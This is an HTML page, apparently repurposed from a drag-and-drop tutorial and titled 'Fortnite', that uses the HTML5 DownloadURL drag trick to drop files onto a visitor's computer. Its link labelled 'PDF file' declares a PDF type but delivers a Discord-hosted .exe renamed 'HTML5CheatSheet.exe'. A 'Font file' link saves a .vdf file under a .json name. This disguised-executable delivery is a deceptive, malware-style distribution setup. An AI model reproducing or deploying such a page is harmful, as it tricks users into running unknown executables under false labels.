<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">

<html lang="en-GB"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta name="author" content=" ">
	<meta name="keywords" content="Drag and drop, HTML5, DownloadURL, setData, dataTransfer">
	<meta name="description" content=" ">
	<meta name="robots" content="all">
	<meta name="copyright" content=" ">

	<link rel="stylesheet" type="text/css" href="./Drag a file from a website to your filesystem like Gmail does _ The CSS Ninja_files/_styles.css" media="screen">

	<title>Fortnite</title>

</head>
<body>

	<div id="cssninja">
		<p><a href="https://op-ffa.net/gfn/index.php">===== GFN =====</a></p>
	</div>

	<div class="container">
		<h1>Pwet 69F8</h1>

		<a href="https://cdn.discordapp.com/attachments/516692639228100621/934940703736336484/update_hosts_cached.vdf" id="dragout" class="dragme" draggable="true" data-downloadurl="application/octet-stream:Eadui2.json:https://cdn.discordapp.com/attachments/516692639228100621/934940703736336484/update_hosts_cached.vdf">Font file</a>

		<a href="https://cdn.discordapp.com/attachments/869283987225473124/1030158467677298739/Lunar_Client_v2.13.0.exe" id="dragout2" class="dragme" draggable="true" data-downloadurl="application/pdf:HTML5CheatSheet.exe:https://cdn.discordapp.com/attachments/869283987225473124/1030158467677298739/Lunar_Client_v2.13.0.exe">PDF file</a>
	</div>

	<script type="text/javascript">
		var files = [document.getElementById("dragout"),document.getElementById("dragout2"),document.getElementById("dragout3")],
			fileDetails = [];

		if(typeof files[0].dataset === "undefined") {

			fileDetails[0] = files[0].getAttribute("data-downloadurl");
			fileDetails[1] = files[1].getAttribute("data-downloadurl");
		} else {
			fileDetails[0] = files[0].dataset.downloadurl;
			fileDetails[1] = files[1].dataset.downloadurl;
		}

		files[0].addEventListener("dragstart",function(evt){
			evt.dataTransfer.setData("DownloadURL",fileDetails[0]);
		},false);
		files[1].addEventListener("dragstart",function(evt){
			evt.dataTransfer.setData("DownloadURL",fileDetails[1]);
		},false);
	</script>

	<!-- Google analytics -->
	<script type="text/javascript">
		var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "https://www.");
		document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
	</script><script src="./Drag a file from a website to your filesystem like Gmail does _ The CSS Ninja_files/ga.js.download" type="text/javascript"></script>
	<script type="text/javascript">
		var pageTracker = _gat._getTracker("UA-4638292-1");
		pageTracker._initData();
		pageTracker._trackPageview();
	</script>



</body></html>
